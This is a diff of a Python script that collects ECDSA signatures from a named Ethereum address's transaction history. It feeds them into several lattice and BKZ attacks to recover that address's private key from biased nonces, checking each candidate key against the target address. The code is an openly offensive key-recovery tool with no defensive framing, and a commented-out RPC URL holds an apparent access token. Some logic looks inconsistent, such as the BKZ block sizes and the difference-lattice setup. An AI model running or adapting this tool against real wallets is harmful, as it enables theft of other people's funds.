@@ -7,7 +7,7 @@ from eth_utils import keccak, to_bytes, to_checksum_address
 from eth_account._utils.legacy_transactions import Transaction
 from eth_keys import keys
 from sage.all import Matrix, ZZ, vector, QQ, RealField
-import arbcheck
+import cryptocheck
 
 # 1. Connect to an Ethereum Node (use your own RPC URL)
 # RPC_URL = "https://small-ancient-replica.quiknode.pro/2aa3c69e6d3ac4f1ab4221ee8c9793e9f6e95532"
@@ -32,6 +32,11 @@ def get_pub_key(z, r, s, v_val):
     public_key = signature.recover_public_key_from_msg_hash(decode_hex(z))
     print(f"Recovered Public Key: {public_key}")
 
+def clean_hex(val):
+    if not val: return b''
+    if isinstance(val, bytes): return val
+    return to_bytes(hexstr=val)
+
 def get_legacy_tx_values(tx_hash):
     # Fetch transaction data
     tx = w3.eth.get_transaction(tx_hash)
@@ -44,10 +49,7 @@ def get_legacy_tx_values(tx_hash):
     # 2. Reconstruct the 'z' (Message Hash)
     # For Pre-2016 (Frontier/Foundation) transactions, we use the 6 core fields
     # order: nonce, gasPrice, gasLimit, to, value, data
-    def clean_hex(val):
-        if not val: return b''
-        if isinstance(val, bytes): return val
-        return to_bytes(hexstr=val)
+    
     
     s_int = int(s_hex, 16)
     # if int(v_val) == 28:
@@ -68,6 +70,8 @@ def get_legacy_tx_values(tx_hash):
     #     r=r_int,
     #     s=s_int
     # )
+    # print(clean_hex(tx['to']),clean_hex(tx['input']))
+    print(int(tx['gasPrice'])," ",int(tx['gas']))
     legacy_tx_fields = [
         int(tx['nonce']),
         int(tx['gasPrice']),
@@ -83,9 +87,9 @@ def get_legacy_tx_values(tx_hash):
     # z_int = int(z_hash, 16)
     z_hash = keccak(unsigned_encoded)
     z_int = int.from_bytes(z_hash, byteorder='big')
-    
+    print(z_int)
     print(f"Transaction: {tx_hash}")
-    print(f"z (Message Hash): {z_hash}")
+    print(f"z (Message Hash): {z_hash.hex()}")
     print(f"r: {r_hex}")
     print(f"s: {s_hex}")
     print(f"v: {v_val}")
@@ -107,15 +111,19 @@ def is_old_tx_failed(tx_receipt):
     # For 2015-era, check if it consumed all gas
     return int(tx_receipt['gasUsed'], 16) == int(tx_receipt['gas'], 16)
 
+def is_simple_tx(tx_receipt):
+    return clean_hex(tx_receipt['input']) == b''
+
 def get_live_signatures(address):
     """Phase 1: Real-time Signature Harvesting"""
     print(f"[{time.strftime('%H:%M:%S')}] Scanning history for {address}...")
     # api = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&sort=desc&apikey={CONFIG['ETHERSCAN_KEY']}"
-    api = f"https://api.etherscan.io/v2/api?chainid=1&module=account&action=txlist&address={address}&sort=asc&apikey={CONFIG['ETHERSCAN_KEY']}"
+    api = f"https://api.etherscan.io/v2/api?chainid=1&module=account&action=txlist&address={address}&sort=desc&apikey={CONFIG['ETHERSCAN_KEY']}"
     txs = requests.get(api).json().get('result', [])
     rLists = []
     zVerifiedCnt = 0
     sigs = []    
+    vCnt = 0
     print(len(txs))
     leading_bias = 6
 
@@ -123,7 +131,7 @@ def get_live_signatures(address):
         # if len(sigs) >= 20:
         #     print("ok")
         #     break # Higher count recommended for EIP-1559
-        if len(sigs) >= 100:
+        if len(sigs) >= 65:
             break
         print(tx_data)
         tx = w3.eth.get_transaction(tx_data['hash'])
@@ -132,12 +140,23 @@ def get_live_signatures(address):
         # 1483228800 is Jan 1, 2017
         # is_early = timestamp < 1483228800 
         is_failed_tx = is_old_tx_failed(tx_data)
+        is_simpled_tx = is_simple_tx(tx_data)
         print(is_failed_tx)
-        if tx['from'].lower() == address.lower() and tx.get('type') == 0 and not is_failed_tx:
+        # if is_failed_tx == 1:
+        #     print(tx_data)
+        if tx['from'].lower() == address.lower() and tx.get('type') == 0 and not is_failed_tx and is_simpled_tx and tx_data['blockNumber'] == '225930':
+        # if tx['from'].lower() == address.lower() and tx.get('type') == 0 and not is_failed_tx:
             # nonce = int(tx.get('nonce', 0))
             # print(nonce)
             z_int, r_int, s_int, v_int = get_legacy_tx_values(tx_data['hash'])
+            if cryptocheck.verify_z(z_int, r_int, s_int, v_int, address):
+                vCnt += 1
             sigs.append((z_int, r_int, s_int, v_int))
+            # if hex(r_int) not in rLists:
+            #     rLists.append(hex(r_int))
+            # else:
+            #     print("found")
+            #     break
             # print(tx['r'].hex())
             # r = tx['r'].hex()
             # r_str = format(r_int, '0256b') # Convert to 256-bit binary string
@@ -147,7 +166,13 @@ def get_live_signatures(address):
             #         rLists.append(hex(r_int))
             #         sigs.append((z_int, r_int, s_int, v_int))
     # estimate_bias(rLists)
+    print(vCnt)
+    # is_uniqu_sigs(sigs)
     # solve_foundation_lattice(sigs, address)
+    # solve_foundation_lattice_ZZ(sigs, address)
+    # solve_foundation_centered_lattice_ZZ(sigs, address)
+    # solve_foundation_trailing_lattice_ZZ(sigs, address)
+    solve_difference_lattice(sigs, address)
     # print(rLists)
 
 def estimate_bias(r_list):
@@ -199,6 +224,43 @@ def verify_address(d, target_address):
     except Exception:
         return False
     
+
+def recover_pubkey(z_int, r_int, s_int, v_int):
+    """
+    Recovers the public key from a signature.
+    z_int: the message hash (as integer)
+    r_int, s_int, v_int: signature components
+    """
+    # Normalize v for recovery (Ethereum v is 27/28 or 37/38)
+    if v_int >= 37:
+        # EIP-155: v = chainId * 2 + 35 or 36
+        # We need recovery_id (0 or 1)
+        # Assuming Mainnet (chainId 1) for this example
+        recovery_id = (v_int - 35) % 2
+    else:
+        # Pre-EIP-155: v = 27 or 28
+        recovery_id = v_int - 27
+
+    # Create the signature object
+    signature = keys.Signature(vrs=(recovery_id, r_int, s_int))
+    
+    # Recover the public key using the message hash z
+    z_bytes = z_int.to_bytes(32, 'big')
+    public_key = signature.recover_public_key_from_msg_hash(z_bytes)
+    
+    return public_key.to_hex()
+
+def is_uniqu_sigs(sigs):
+    public_keys = set()
+    for i, sig in enumerate(sigs):
+        z, r, s, v = sig
+        pub = recover_pubkey(z, r, s, v)
+        public_keys.add(pub)
+        print(f"Sig {i}: {pub}")
+    if len(public_keys) == 1:
+        print("\nSUCCESS: All signatures use the same key.")
+    else:
+        print(f"\nWARNING: Found {len(public_keys)} different keys.")
     
 # def solve_foundation_lattice(signatures, bias_bits, target_address):
 def solve_foundation_lattice(signatures, target_address):
@@ -206,19 +268,22 @@ def solve_foundation_lattice(signatures, target_address):
     if m < 2: return None
 
     # k < 2^(256 - bias_bits)
-    for bias_bits in range(1, 10):
+    found = False
+    for bias_bits in range(1, 16):
         B = 2**(256 - bias_bits)
+        print(B)
         
         # 1. NORMALIZE SIGNATURES (The Foundation Era Fix)
         # If v=28, we use the High-S complement (N-s) because early wallets
         # often signed that way. This ensures the math matches the k bias.
         normalized_sigs = []
         for z, r, s, v in signatures:
-            # if v == 28 or s > (N // 2):
-            if s >= HALF_N:
+            if v == 28 or s > (N // 2):
+            # if s >= HALF_N:
                 s_fixed = N - s
             else:
                 s_fixed = s
+            # s_fixed = N - s
             normalized_sigs.append((z, r, s_fixed))
 
         # 2. CONSTRUCT MATRIX (Embedding Technique)
@@ -247,7 +312,7 @@ def solve_foundation_lattice(signatures, target_address):
         print("---START---")
 
         # 3. ROBUST RECOVERY LOOP
-        found = False
+        
         for row_idx, row in enumerate(L_reduced):
             # We check every signature position in the row
             for sig_idx in range(m):
@@ -267,13 +332,309 @@ def solve_foundation_lattice(signatures, target_address):
                     # Verify against the Target Address
                     if verify_address(d, target_address):
                         found = True
-                        break
+                        # break
                         # print(f"\n[!!!] SUCCESS! Found Key in Row {row_idx}, Sig {sig_idx}")
                         # print(f"[!] Private Key: {hex(d)}")
                         # return d
                     
     print(found)
-    print("[x] No key found. Check Z-hashes or increase Bias Bits.")
+    # print("[x] No key found. Check Z-hashes or increase Bias Bits.")
+    return None
+
+def solve_foundation_lattice_ZZ(signatures, target_address):
+    m = len(signatures)
+    if m < 2: return None
+
+    # k < 2^(256 - bias_bits)
+    found = False
+    for bias_bits in range(1, 16):
+        B = 2**(256 - bias_bits)
+        print(B)
+        
+        # 1. NORMALIZE SIGNATURES (The Foundation Era Fix)
+        # If v=28, we use the High-S complement (N-s) because early wallets
+        # often signed that way. This ensures the math matches the k bias.
+        normalized_sigs = []
+        for z, r, s, v in signatures:
+            if int(v) == 28 or s > (N // 2):
+            # if s >= HALF_N:
+                s_fixed = N - s
+            else:
+                s_fixed = s
+            # s_fixed = N - s
+            normalized_sigs.append((z, r, s_fixed))
+
+        # 2. CONSTRUCT MATRIX (Embedding Technique)
+        print(f"[*] Building {m+2}x{m+2} lattice with {bias_bits} bits of bias...")
+        L = Matrix(ZZ, m + 2, m + 2)
+        # L = Matrix(RealField(1024), m + 2, m + 2)
+        
+
+        for i in range(m):
+            z, r, s = normalized_sigs[i]
+            s_inv = pow(s, -1, N)
+            
+            t_i = (r * s_inv) % N
+            u_i = (-(z * s_inv)) % N
+            # u_i = ((z * s_inv)) % N
+            
+            L[i, i] = N
+            L[m, i] = t_i
+            L[m + 1, i] = u_i
+
+        # Scaling factors for the Embedding approach
+        L[m, m] = 1 #set to 1 or B / N
+        L[m + 1, m + 1] = B
+
+        print("[*] Performing BKZ-40 reduction... started at 12:02 PM.")
+        L_reduced = L.BKZ(block_size=30)
+        print("---START---")
+
+        # 3. ROBUST RECOVERY LOOP
+        
+        for row_idx, row in enumerate(L_reduced):
+            # We check every signature position in the row
+            for sig_idx in range(m):
+                k_cand = abs(int(row[sig_idx]))
+                
+                if k_cand <= 1: continue
+                
+                # Use the normalized values for the recovery formula
+                z, r, s = normalized_sigs[sig_idx]
+                
+                s_options = [s, N - s]
+                # if v0 == 28: s_options = [N - s0_orig, s0_orig]
+                # Formula: d = (s*k - z) * r^-1 mod N
+                for s_tem in s_options:
+                    d = ((s_tem * k_cand - z) * pow(r, -1, N)) % N
+                    d1 = ((s_tem * k_cand + z) * pow(r, -1, N)) % N
+                    
+                    # Verify against the Target Address
+                    if verify_address(d, target_address) or verify_address(d1, target_address):
+                        found = True
+                        # break
+                        # return d
+                    
+    print(found)
+    return None
+
+def solve_foundation_centered_lattice_ZZ(signatures, target_address):
+    m = len(signatures)
+    if m < 2: return None
+
+    # k < 2^(256 - bias_bits)
+    found = False
+    for bias_bits in range(1, 17):
+        B = 2**(256 - bias_bits)
+        shift = 2**(255 - bias_bits)
+        print(B)
+        
+        # 1. NORMALIZE SIGNATURES (The Foundation Era Fix)
+        # If v=28, we use the High-S complement (N-s) because early wallets
+        # often signed that way. This ensures the math matches the k bias.
+        normalized_sigs = []
+        for z, r, s, v in signatures:
+            # if int(v) == 28 or s > (N // 2):
+            if s >= HALF_N:
+                s_fixed = N - s
+            else:
+                s_fixed = s
+            # s_fixed = N - s
+            normalized_sigs.append((z, r, s_fixed))
+
+        # 2. CONSTRUCT MATRIX (Embedding Technique)
+        print(f"[*] Building {m+2}x{m+2} lattice with {bias_bits} bits of bias...")
+        L = Matrix(ZZ, m + 2, m + 2)
+        # L = Matrix(RealField(1024), m + 2, m + 2)
+        
+
+        for i in range(m):
+            z, r, s = normalized_sigs[i]
+            s_inv = pow(s, -1, N)
+
+            # --- THE CENTERED FIX ---
+            # Shift z to center the expected nonce at zero
+            z_new = (z + (r * shift)) % N
+            
+            t_i = (r * s_inv) % N
+            # u_i = (-(z * s_inv)) % N
+            # u_i = ((z * s_inv)) % N
+            u_i = (-z_new * s_inv) % N
+            
+            L[i, i] = N
+            L[m, i] = t_i
+            L[m + 1, i] = u_i
+
+        # Scaling factors for the Embedding approach
+        L[m, m] = 1 #set to 1 or B / N
+        L[m + 1, m + 1] = B
+
+        print("[*] Performing BKZ-40 reduction... started at 12:02 PM.")
+        L_reduced = L.BKZ(block_size=40)
+        print("---START---")
+
+        # 3. ROBUST RECOVERY LOOP
+        
+        for row_idx, row in enumerate(L_reduced):
+            # We check every signature position in the row
+            for sig_idx in range(m):
+                # k_cand = abs(int(row[sig_idx]))
+                k_cand = abs(int(row[sig_idx])-shift)
+                
+                if k_cand <= 1: continue
+                
+                # Use the normalized values for the recovery formula
+                z, r, s = normalized_sigs[sig_idx]
+
+                z_new = (z + (r * shift)) % N
+                #z_new = z
+                
+                s_options = [s, N - s]
+                # if v0 == 28: s_options = [N - s0_orig, s0_orig]
+                # Formula: d = (s*k - z) * r^-1 mod N
+                for s_tem in s_options:
+                    d = ((s_tem * k_cand - z_new) * pow(r, -1, N)) % N
+                    d1 = ((s_tem * k_cand + z_new) * pow(r, -1, N)) % N
+                    
+                    # Verify against the Target Address
+                    if verify_address(d, target_address) or verify_address(d1, target_address):
+                        found = True
+                        # break
+                        # return d
+                    
+    print(found)
+    return None
+
+def solve_foundation_trailing_lattice_ZZ(signatures, target_address):
+    m = len(signatures)
+    if m < 2: return None
+
+    # k < 2^(256 - bias_bits)
+    found = False
+    for bias_bits in range(3, 18):
+        B = 2**(256 - bias_bits)
+        shift_inv = pow(2**bias_bits, -1, N)
+        shift_factor = 2**bias_bits
+        print(B)
+        
+        # 1. NORMALIZE SIGNATURES (The Foundation Era Fix)
+        # If v=28, we use the High-S complement (N-s) because early wallets
+        # often signed that way. This ensures the math matches the k bias.
+        normalized_sigs = []
+        for z, r, s, v in signatures:
+            # if int(v) == 28 or s > (N // 2):
+            if s >= HALF_N:
+                s_fixed = N - s
+            else:
+                s_fixed = s
+            # s_fixed = N - s
+            normalized_sigs.append((z, r, s_fixed))
+
+        # 2. CONSTRUCT MATRIX (Embedding Technique)
+        print(f"[*] Building {m+2}x{m+2} lattice with {bias_bits} bits of bias...")
+        L = Matrix(ZZ, m + 2, m + 2)
+        # L = Matrix(RealField(1024), m + 2, m + 2)
+        
+
+        for i in range(m):
+            z, r, s = normalized_sigs[i]
+            s_inv = pow(s, -1, N)
+
+            # --- THE CENTERED FIX ---
+            # Shift z to center the expected nonce at zero
+            # z_new = (z + (r * shift)) % N
+            
+            t_i = (r * s_inv * shift_inv) % N
+            u_i = (-z * s_inv * shift_inv) % N
+            
+            L[i, i] = N
+            L[m, i] = t_i
+            L[m + 1, i] = u_i
+
+        # Scaling factors for the Embedding approach
+        L[m, m] = 1 #set to 1 or B / N
+        L[m + 1, m + 1] = B
+
+        print("[*] Performing BKZ-40 reduction... started at 12:02 PM.")
+        L_reduced = L.BKZ(block_size=40)
+        print("---START---")
+
+        # 3. ROBUST RECOVERY LOOP
+        
+        for row_idx, row in enumerate(L_reduced):
+            # We check every signature position in the row
+            for sig_idx in range(m):
+                # k_cand = abs(int(row[sig_idx]))
+                k_cand = abs(int(row[sig_idx]))
+                
+                if k_cand <= 1: continue
+                k_cand = (k_cand * shift_factor) % N
+                # Use the normalized values for the recovery formula
+                z, r, s = normalized_sigs[sig_idx]
+
+                s_options = [s, N - s]
+                # if v0 == 28: s_options = [N - s0_orig, s0_orig]
+                # Formula: d = (s*k - z) * r^-1 mod N
+                for s_tem in s_options:
+                    d = ((s_tem * k_cand - z) * pow(r, -1, N)) % N
+                    d1 = ((s_tem * k_cand + z) * pow(r, -1, N)) % N
+                    
+                    # Verify against the Target Address
+                    if verify_address(d, target_address) or verify_address(d1, target_address):
+                        found = True
+                        # break
+                        # return d
+                    
+    print(found)
+    return None
+
+def solve_difference_lattice(sigs, address):
+    """
+    sigs: List of [z, r, s] from your 65 verified signatures
+    """
+    m = len(sigs)
+    # The matrix size is (m+1)x(m+1) to account for d and the constant
+    # We work on the differences between (i) and (i+1)
+    matrix = Matrix(ZZ, m + 1, m + 1)
+    
+    # We define the relationship: (k_i+1 - k_i) = (u_i+1 - u_i) + d(t_i+1 - t_i)
+    found = False
+    for i in range(m - 1):
+        z1, r1, s1, v1 = sigs[i]
+        z2, r2, s2, v2 = sigs[i+1]
+        
+        # Ensure Low-S normalization
+        if s1 > N//2: s1 = N - s1
+        if s2 > N//2: s2 = N - s2
+        
+        s1_inv = pow(s1, -1, N)
+        s2_inv = pow(s2, -1, N)
+        
+        # Calculate the relative differences
+        t_diff = (r2 * s2_inv - r1 * s1_inv) % N
+        u_diff = (z2 * s2_inv - z1 * s1_inv) % N
+        
+        matrix[i, i] = N
+        matrix[m - 1, i] = t_diff
+        matrix[m, i] = u_diff
+
+    # --- THE WEIGHTING ---
+    # Weight for the private key d
+    matrix[m - 1, m - 1] = 1 
+    # Weight for the nonce difference (set to 1 if nonces are perfectly +1)
+    matrix[m, m] = 1 # nonces are not sequential setting to 1000
+
+    print(f"Reducing difference matrix for sequential nonces...")
+    reduced = matrix.BKZ(block_size=40)
+
+    for row in reduced:
+        # In a difference matrix, the 'd' candidate is often in the penultimate column
+        d = abs(row[-2]) % N
+        
+        if d > 1:
+            if verify_address(d, address):
+                found = True
+    print(found)
     return None
 
 def solve_hnp_with_lll(signatures, bias_bits, address):
@@ -372,7 +733,7 @@ if __name__ == "__main__":
     #address = "0x120A270bbC009644e35F0bB6ab13f95b8199c4ad"
     address = "0xC839EE5542b4E8413246b3634C5c739fEA949562"
     # Example: A random early 2015 transaction hash
-    # hash1 = "0x1c216750ab591992f6957fdd3cc7cc6d9a746c9d37141a0adbdce590d8d2ad15" 
+    # hash1 = "0x6d498b721c918c5f6e904918f8a96044e79747f34b5e71a018aac1c4bec8caf9" 
     # hash2 = "0x373b8f71941cb7c70e5bbcd7341acf7106e31f95254527c7d33c0ce98d320af5"
     # data1 = get_legacy_tx_values(hash1)
     # data2 = get_legacy_tx_values(hash2)
